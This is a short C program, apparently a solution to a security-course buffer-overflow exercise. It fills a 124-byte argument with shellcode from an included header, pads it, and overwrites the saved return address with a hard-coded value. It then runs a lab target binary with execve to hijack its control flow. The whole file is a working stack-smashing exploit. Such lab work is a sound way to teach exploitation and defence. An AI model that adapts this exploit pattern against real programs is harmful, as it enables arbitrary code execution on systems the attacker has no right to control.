#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target1"

int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[1];

	char large_string[124];
	int i;
	for(i = 0; i < strlen(shellcode); i++){
		large_string[i] = shellcode[i];
	}
	for(i = strlen(shellcode); i < 120; i++){
		large_string[i] = '0';
	}
	
	large_string[120] = '\x10';
	large_string[121] = '\xfe';
	large_string[122] = '\x21';
	large_string[123] = '\x20';

	args[0] = TARGET;
	args[1] = large_string; 
	args[2] = NULL;

	env[0] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
